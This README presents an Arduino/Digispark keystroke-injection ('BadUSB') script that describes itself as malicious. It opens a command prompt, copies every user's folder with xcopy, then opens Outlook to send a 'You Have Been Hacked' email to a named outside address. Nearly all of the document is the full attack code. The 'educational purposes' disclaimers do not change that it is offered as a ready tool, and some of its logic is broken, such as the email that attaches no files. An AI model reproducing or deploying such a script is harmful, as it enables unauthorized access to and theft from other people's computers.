# Backup Files Theft Script

## Description

This script is an example of a malicious code that steals backup files from all users on a device and sends them to a specified email address. The script utilizes the `DigiKeyboard` library to simulate keyboard actions for executing commands on a Windows system. Please note that using or distributing such code for illegal purposes is strictly prohibited and unethical.

**Disclaimer: This script is for educational purposes only.**

## How It Works

1. **Stealing Backup Files:**
   - The script opens the Command Prompt (`cmd`) using a keypress sequence.
   - It uses the `xcopy` command to copy backup files from all users on the system to a folder (`C:\Backup\`).

2. **Sending the Files via Email:**
   - After copying the files, the script opens Microsoft Outlook and creates a new email.
   - The email is sent to a predefined static email address (in this case, `yagiz_aladag@hotmail.com`) with the subject "BackupFiles" and the message "You Have Been Hacked by Yagiz."

## Code Walkthrough

```cpp
#include "DigiKeyboard.h"

// Setup function: Initializes the keyboard actions
void setup() {
    DigiKeyboard.delay(500); 
    DigiKeyboard.sendKeyStroke(0); 
    DigiKeyboard.delay(500);

    // Open Command Prompt
    DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); 
    DigiKeyboard.delay(500);
    DigiKeyboard.print("cmd");
    DigiKeyboard.sendKeyStroke(KEY_CTRL_LEFT, MOD_SHIFT_LEFT); 
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(1000); 

    // Copy backup files
    DigiKeyboard.print("xcopy C:\\Users\\* C:\\Backup\\ /E /H /K /Y");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(5000); 

    // Open Outlook and send email
    DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); 
    DigiKeyboard.delay(500);
    DigiKeyboard.print("outlook");
    DigiKeyboard.sendKeyStroke(KEY_ENTER); 
    DigiKeyboard.delay(3000); 
    DigiKeyboard.sendKeyStroke(KEY_N, MOD_CONTROL_LEFT); 
    DigiKeyboard.delay(1000); 
    DigiKeyboard.print("yagiz_aladag@hotmail.com");
    DigiKeyboard.sendKeyStroke(KEY_TAB); 
    DigiKeyboard.delay(500);
    DigiKeyboard.print("BackupFiles");
    DigiKeyboard.sendKeyStroke(KEY_TAB); 
    DigiKeyboard.delay(500);
    DigiKeyboard.print("You Have Been Hacked by Yagiz.");
    DigiKeyboard.sendKeyStroke(KEY_TAB); 
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(KEY_ENTER); 
}

void loop() {
    // No loop needed for this task
}
Important Notes
Ethical Use: This code is not intended for use in real-world scenarios. It showcases how a malicious actor could exploit automated keystrokes to perform harmful actions. Use of this code without consent is illegal.
Security: Always ensure your devices are secure and take proper measures to prevent unauthorized access.
License
This project is for educational purposes only. It is important to comply with ethical standards and legal requirements when using or distributing code.

Warning
This code should never be used for malicious intent. Always ensure that your work aligns with ethical guidelines and legal standards. The script shown here is to demonstrate how vulnerabilities in system security can be exploited.

For more information, refer to DigiKeyboard Documentation.
